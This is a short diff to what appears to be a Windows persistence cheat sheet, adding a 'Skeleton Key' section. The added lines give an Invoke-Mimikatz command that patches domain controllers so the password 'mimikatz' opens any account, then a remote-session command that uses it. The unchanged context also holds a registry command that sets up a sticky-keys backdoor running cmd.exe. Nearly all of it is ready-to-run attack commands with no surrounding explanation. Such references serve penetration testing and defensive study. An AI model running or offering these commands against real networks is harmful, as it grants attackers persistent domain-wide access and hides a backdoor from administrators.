@@ -17,6 +17,7 @@
     * [Services](#services)
     * [Scheduled Task](#scheduled-task)
     * [RDP Backdoor](#rdp-backdoor)
+    * [Skeleton Key](#skeleton-key)
 * [References](#references)
 
 
@@ -174,6 +175,15 @@ Hit F5 a bunch of times when you are at the RDP login screen.
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
+### Skeleton Key
+
+```powershell
+# Exploitation Command runned as DA:
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>
+
+# Access using the password "mimikatz"
+Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
+```
 
 ## References
 
